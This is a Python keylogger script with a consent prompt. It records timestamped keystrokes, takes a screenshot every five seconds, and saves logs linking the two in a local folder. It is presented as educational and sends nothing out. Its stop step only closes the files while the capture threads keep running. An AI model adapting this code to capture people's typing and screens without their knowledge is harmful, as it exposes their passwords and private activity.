import os
import threading
import time
from datetime import datetime
import pyautogui
from pynput import keyboard
import tkinter as tk
from tkinter import messagebox

# ================= CONSENT =================
root = tk.Tk()
root.withdraw()

consent = messagebox.askyesno(
    "User Consent",
    "This program records keyboard activity and screenshots for educational purposes.\n\nDo you agree?"
)

if not consent:
    exit()

# ================= SESSION FOLDER =================
session_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
base_folder = f"Session_{session_time}"
os.makedirs(base_folder)
os.makedirs(f"{base_folder}/screenshots")

key_log_file = open(f"{base_folder}/keystrokes.txt", "a", buffering=1)
association_file = open(f"{base_folder}/association_log.txt", "a", buffering=1)

# ================= KEY STORAGE =================
key_buffer = []  # stores (time, key)

def on_press(key):
    key_time = datetime.now()
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    key_log_file.write(f"[{key_time}] {key_char}\n")
    key_buffer.append((key_time, key_char))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# ================= SCREENSHOT + ASSOCIATION =================
def take_screenshots():
    last_time = datetime.now()

    while True:
        time.sleep(5)
        current_time = datetime.now()
        timestamp = current_time.strftime("%H-%M-%S")

        screenshot_name = f"screen_{timestamp}.png"
        screenshot_path = f"{base_folder}/screenshots/{screenshot_name}"

        pyautogui.screenshot().save(screenshot_path)

        # Associate keys
        keys_in_interval = [
            k for (t, k) in key_buffer if last_time <= t <= current_time
        ]

        association_file.write(f"Screenshot: {screenshot_name}\n")
        association_file.write(
            f"Time Interval: {last_time.strftime('%H:%M:%S')} to {current_time.strftime('%H:%M:%S')}\n"
        )
        association_file.write(
            f"Keys Pressed: {' '.join(keys_in_interval) if keys_in_interval else 'None'}\n"
        )
        association_file.write("-" * 50 + "\n")

        last_time = current_time

# ================= THREADING =================
key_thread = threading.Thread(target=start_keylogger)
screen_thread = threading.Thread(target=take_screenshots)

key_thread.start()
screen_thread.start()

# ================= RUN =================
messagebox.showinfo(
    "Running",
    "Logging is active.\n\nPress OK to STOP logging."
)

key_log_file.close()
association_file.close()
